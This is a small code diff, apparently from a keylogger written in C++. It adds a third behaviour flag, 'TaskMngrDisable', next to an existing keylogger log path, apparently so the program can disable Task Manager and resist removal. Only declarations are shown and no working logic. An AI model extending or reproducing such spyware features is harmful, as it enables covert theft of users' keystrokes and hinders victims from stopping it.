@@ -13,7 +13,8 @@
 /**
  * Behaves
 */
-#define BEHAVES_COUNT 2
+#define BEHAVES_COUNT 3
+static bool TaskMngrDisable = true;
 
 static std::string StandardLogPath = getStandardLogPath();
 static std::string KeyLogPath = getKeyLoggerLogPath();
